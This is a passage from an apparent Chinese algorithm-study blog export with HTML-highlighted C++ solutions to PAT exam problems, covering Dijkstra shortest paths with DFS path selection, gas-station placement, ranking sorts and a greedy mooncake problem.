class="keyword">int</span> need=<span class="number">0</span>,remain=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=tempath.size()<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">int</span> id=tempath[i];</span><br><span class="line">            <span class="keyword">if</span>(dot[id]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                remain+=dot[id];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(remain&gt;<span class="built_in">abs</span>(dot[id]))&#123;</span><br><span class="line">                    remain-=<span class="built_in">abs</span>(dot[id]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    need+=<span class="built_in">abs</span>(dot[id])-remain;</span><br><span class="line">                    remain=<span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(need&lt;minNeed)&#123;</span><br><span class="line">            minNeed=need;</span><br><span class="line">            minRemain=remain;</span><br><span class="line">            path=tempath;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(need==minNeed&amp;&amp;remain&lt;minRemain)&#123;</span><br><span class="line">            minRemain=remain;</span><br><span class="line">            path=tempath;</span><br><span class="line">        &#125;</span><br><span class="line">        tempath.pop_back();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tempath.push_back(v);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;pre[v].size();i++)&#123;</span><br><span class="line">        DFS(pre[v][i]);</span><br><span class="line">    &#125;</span><br><span class="line">    tempath.pop_back();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>,&amp;c,&amp;n,&amp;s,&amp;m);</span><br><span class="line">    fill(G[<span class="number">0</span>],G[<span class="number">0</span>]+MAXN*MAXN,INF);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;dot[i]);</span><br><span class="line">        dot[i]-=c/<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;G[a][b]);</span><br><span class="line">        G[b][a]=G[a][b];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 求最短路径 Dijkstra</span></span><br><span class="line">    Dijkstra(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//DFS</span></span><br><span class="line">    DFS(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,minNeed);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=path.size()<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,path[i]);</span><br><span class="line">        <span class="keyword">if</span>(i&gt;<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;-&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>,minRemain);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">//PAT A1072</span></span><br><span class="line"><span class="comment">//题型是最短路径，条件是cost</span></span><br><span class="line"><span class="comment">//次条件是平均距离</span></span><br><span class="line"><span class="keyword">int</span> n,m,k,ds;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAXN=<span class="number">1020</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF=<span class="number">1000000000</span>;</span><br><span class="line"><span class="keyword">int</span> G[MAXN][MAXN];</span><br><span class="line"><span class="keyword">int</span> d[MAXN];</span><br><span class="line"><span class="keyword">bool</span> vis[MAXN]=&#123;<span class="literal">false</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getID</span><span class="params">(<span class="keyword">char</span> str[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,len=<span class="built_in">strlen</span>(str),ID=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;len)&#123;</span><br><span class="line">        <span class="keyword">if</span>(str[i]!=<span class="string">&#x27;G&#x27;</span>)&#123;</span><br><span class="line">            ID=ID*<span class="number">10</span>+(str[i]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>]==<span class="string">&#x27;G&#x27;</span>) <span class="keyword">return</span> n+ID;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> ID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line">    fill(d,d+MAXN,INF);</span><br><span class="line">    d[s]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n+m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> u=<span class="number">-1</span>,MIN=INF;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m+n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(vis[j]==<span class="literal">false</span>&amp;&amp;d[j]&lt;MIN)&#123;</span><br><span class="line">                u=j;</span><br><span class="line">                MIN=d[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(u==<span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">        vis[u]=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> v=<span class="number">1</span>;v&lt;=n+m;v++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(vis[v]==<span class="literal">false</span>&amp;&amp;G[u][v]!=INF)&#123;</span><br><span class="line">                <span class="keyword">if</span>(G[u][v]+d[u]&lt;d[v])&#123;</span><br><span class="line">                    d[v]=d[u]+G[u][v];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>,&amp;n,&amp;m,&amp;k,&amp;ds);</span><br><span class="line">    <span class="keyword">char</span> city1[<span class="number">5</span>],city2[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">int</span> u,v,w;</span><br><span class="line">    fill(G[<span class="number">0</span>],G[<span class="number">0</span>]+MAXN*MAXN,INF);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s %s %d&quot;</span>,&amp;city1,city2,&amp;w);</span><br><span class="line">        u=getID(city1);</span><br><span class="line">        v=getID(city2);</span><br><span class="line">        G[u][v]=G[v][u]=w;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ansID=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">double</span> ansDis=<span class="number">-1</span>,ansAvg=INF;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n+<span class="number">1</span>;i&lt;=n+m;i++)&#123;</span><br><span class="line">        <span class="keyword">double</span> minDis=INF,avg=<span class="number">0</span>;</span><br><span class="line">        Dijkstra(i);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(d[j]&gt;ds)&#123;</span><br><span class="line">                minDis=<span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(d[j]&lt;minDis) minDis=d[j];</span><br><span class="line">            avg+=<span class="number">1.0</span>*d[j]/n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(minDis==<span class="number">-1</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(minDis&gt;ansDis)&#123;</span><br><span class="line">            ansID=i;</span><br><span class="line">            ansDis=minDis;</span><br><span class="line">            ansAvg=avg;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(minDis==ansDis&amp;&amp;avg&lt;ansAvg)&#123;</span><br><span class="line">            ansID=i;</span><br><span class="line">            ansAvg=avg;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ansID==<span class="number">-1</span>) <span class="built_in">printf</span>(<span class="string">&quot;No Solution\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;G%d\n&quot;</span>,ansID-n);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%.1f %.1f\n&quot;</span>,ansDis,ansAvg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">//PAT A1087</span></span><br><span class="line"><span class="comment">//cost + happiness + ave_cost</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAXN=<span class="number">220</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF=<span class="number">1000000000</span>;</span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="keyword">char</span> ed[<span class="number">5</span>];</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>,<span class="keyword">int</span>&gt; strToInt;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="built_in">string</span>&gt; intToStr;</span><br><span class="line"><span class="keyword">int</span> G[MAXN][MAXN];</span><br><span class="line"><span class="keyword">int</span> hap[MAXN];</span><br><span class="line"><span class="keyword">int</span> d[MAXN];</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; pre[MAXN];</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; tempath,path;</span><br><span class="line"><span class="keyword">int</span> numPath=<span class="number">0</span>,maxH=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">double</span> aveH=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> vis[MAXN]=&#123;<span class="literal">false</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fill(d,d+MAXN,INF);</span><br><span class="line">    d[s]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> u=<span class="number">-1</span>,MIN=INF;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(vis[j]==<span class="literal">false</span>&amp;&amp;d[j]&lt;MIN)&#123;</span><br><span class="line">                MIN=d[j];</span><br><span class="line">                u=j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(u==<span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">        vis[u]=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> v=<span class="number">0</span>;v&lt;n;v++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(vis[v]==<span class="literal">false</span>&amp;&amp;G[u][v]!=INF)&#123;</span><br><span class="line">                <span class="keyword">if</span>(G[u][v]+d[u]&lt;d[v])&#123;</span><br><span class="line">                    d[v]=d[u]+G[u][v];</span><br><span class="line">                    pre[v].clear();</span><br><span class="line">                    pre[v].push_back(u);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(G[u][v]+d[u]==d[v])&#123;</span><br><span class="line">                    pre[v].push_back(u);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(v==<span class="number">0</span>)&#123;</span><br><span class="line">        tempath.push_back(<span class="number">0</span>);</span><br><span class="line">        numPath++;</span><br><span class="line">        <span class="keyword">int</span> tempW=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=tempath.size()<span class="number">-2</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">int</span> id=tempath[i];</span><br><span class="line">            tempW+=hap[id];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">double</span> tempA=<span class="number">1.0</span>*tempW/(tempath.size()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(tempW&gt;maxH)&#123;</span><br><span class="line">            maxH=tempW;</span><br><span class="line">            aveH=tempA;</span><br><span class="line">            path=tempath;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(tempW==maxH&amp;&amp;tempA&gt;aveH)&#123;</span><br><span class="line">            path=tempath;</span><br><span class="line">            aveH=tempA;</span><br><span class="line">        &#125;</span><br><span class="line">        tempath.pop_back();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tempath.push_back(v);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;pre[v].size();i++)&#123;</span><br><span class="line">        DFS(pre[v][i]);</span><br><span class="line">    &#125;</span><br><span class="line">    tempath.pop_back();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %s&quot;</span>,&amp;n,&amp;k,ed);</span><br><span class="line">    fill(G[<span class="number">0</span>],G[<span class="number">0</span>]+MAXN*MAXN,INF);</span><br><span class="line">    strToInt[ed]=<span class="number">0</span>;</span><br><span class="line">    intToStr[<span class="number">0</span>]=ed;</span><br><span class="line">    <span class="keyword">char</span> temp1[<span class="number">5</span>],temp2[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">int</span> ha;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s %d&quot;</span>,temp1,&amp;ha);</span><br><span class="line">        strToInt[temp1]=i;</span><br><span class="line">        intToStr[i]=temp1;</span><br><span class="line">        hap[i]=ha;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s %s %d&quot;</span>,temp1,temp2,&amp;ha);</span><br><span class="line">        <span class="keyword">int</span> a,b;</span><br><span class="line">        a=strToInt[temp1];</span><br><span class="line">        b=strToInt[temp2];</span><br><span class="line">        G[a][b]=G[b][a]=ha;</span><br><span class="line">    &#125;</span><br><span class="line">    Dijkstra(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> rom=strToInt[<span class="string">&quot;ROM&quot;</span>];</span><br><span class="line">    DFS(rom);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d\n&quot;</span>,numPath,d[rom],maxH,(<span class="keyword">int</span>)aveH);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=path.size()<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;intToStr[path[i]];</span><br><span class="line">        <span class="keyword">if</span>(i&gt;<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;-&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法笔记_第四章</title>
    <url>/2020/01/22/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0-%E7%AC%AC%E5%9B%9B%E7%AB%A0/</url>
    <content><![CDATA[<p>第四章书上的题目+Codeup+上机训练</p>
<span id="more"></span>

<h2 id="4-书"><a href="#4-书" class="headerlink" title="4(书)"></a>4(书)</h2><h3 id="4-1"><a href="#4-1" class="headerlink" title="4.1"></a>4.1</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1025</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> registration_number[<span class="number">15</span>];</span><br><span class="line">    <span class="keyword">int</span> final_rank=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> location_number=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> local_rank=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> score=<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">more</span><span class="params">(student a,student b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a.score!=b.score) <span class="keyword">return</span> a.score&gt;b.score;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">strcmp</span>(a.registration_number,b.registration_number)&lt;<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N);</span><br><span class="line">    student ans[<span class="number">30010</span>];</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=N;k++)&#123;</span><br><span class="line">        <span class="keyword">int</span> n=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s %d&quot;</span>,ans[num].registration_number,&amp;ans[num].score);</span><br><span class="line">            ans[num].location_number=k;  <span class="comment">////local number</span></span><br><span class="line">            num++;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(ans+num-n,ans+num,more);   <span class="comment">//sort by local rank</span></span><br><span class="line">        ans[num-n].local_rank=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=num-n+<span class="number">1</span>;i&lt;num;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(ans[i].score==ans[i<span class="number">-1</span>].score)</span><br><span class="line">                ans[i].local_rank=ans[i<span class="number">-1</span>].local_rank;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                ans[i].local_rank=i+<span class="number">1</span>-(num-n);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(ans,ans+num,more);   <span class="comment">//sort by final rank</span></span><br><span class="line">    ans[<span class="number">0</span>].final_rank=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;num;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(ans[i].score==ans[i<span class="number">-1</span>].score)</span><br><span class="line">            ans[i].final_rank=ans[i<span class="number">-1</span>].final_rank;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            ans[i].final_rank=i+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,num);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s %d %d %d\n&quot;</span>,ans[i].registration_number,ans[i].final_rank,ans[i].location_number,ans[i].local_rank);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4-4"><a href="#4-4" class="headerlink" title="4.4"></a>4.4</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT B1020</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mooncake</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">double</span> t;</span><br><span class="line">    <span class="keyword">double</span> sum;</span><br><span class="line">    <span class="keyword">double</span> price;</span><br><span class="line">&#125;now[<span class="number">1010</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(mooncake a,mooncake b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.price&gt;b.price;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line">    <span class="keyword">double</span> D;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%lf&quot;</span>,&amp;N,&amp;D);</span><br><span class="line">    <span class="comment">//mooncake now[N];</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>,&amp;now[i].t);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>,&amp;now[i].sum);</span><br><span class="line">        now[i].price=now[i].sum/now[i].t;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(now,now+N,cmp);</span><br><span class="line">    <span class="keyword">double</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span 